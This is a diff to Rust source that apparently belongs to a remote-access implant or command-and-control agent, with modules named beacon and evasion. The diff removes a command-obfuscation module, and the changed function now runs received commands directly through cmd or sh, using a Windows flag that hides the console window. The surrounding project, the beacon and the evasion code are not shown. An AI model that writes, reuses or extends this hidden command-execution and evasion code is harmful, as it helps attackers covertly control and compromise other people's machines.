@@ -22,7 +22,6 @@ macro_rules! debug_print {
     };
 }
 
-mod argfuscator;
 mod beacon;
 mod config;
 mod evasion;
@@ -543,22 +542,20 @@ fn get_system_info(info_type: &str) -> String {
 // COMMAND EXECUTION
 // ============================================================================
 fn execute_command(command: &str) -> String {
-    let obfuscated_cmd = argfuscator::obfuscate(command);
-    debug_print!("DEBUG: Original: {}", command);
-    debug_print!("DEBUG: Obfuscated: {}", obfuscated_cmd);
+    debug_print!("DEBUG: Ejecutando comando: {}", command);
 
     #[cfg(target_os = "windows")]
     let output = {
         use std::os::windows::process::CommandExt;
         Command::new("cmd")
-            .args(&["/C", &obfuscated_cmd])
+            .args(&["/C", command])
             .creation_flags(0x08000000)
             .output()
     };
 
     #[cfg(not(target_os = "windows"))]
     let output = Command::new("sh")
-        .args(&["-c", &obfuscated_cmd])
+        .args(&["-c", command])
         .output();
 
     match output {
